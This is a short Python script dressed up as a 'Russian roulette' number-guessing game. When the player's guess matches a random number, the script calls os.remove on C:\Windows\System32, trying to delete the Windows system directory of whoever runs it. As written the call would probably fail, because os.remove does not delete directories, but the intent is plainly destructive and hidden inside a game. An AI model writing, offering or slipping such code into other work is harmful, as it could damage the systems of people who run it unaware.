import random, os

def rou():
    x = int(input("Your guess: "))
    if x != y:
        print("You live")
    else:
        os.remove("C:\Windows\System32")

    

while True:
    y = random.randint(1,10)
    try:
        rou()
    except ValueError:
        print("Please Choose a number")
        continue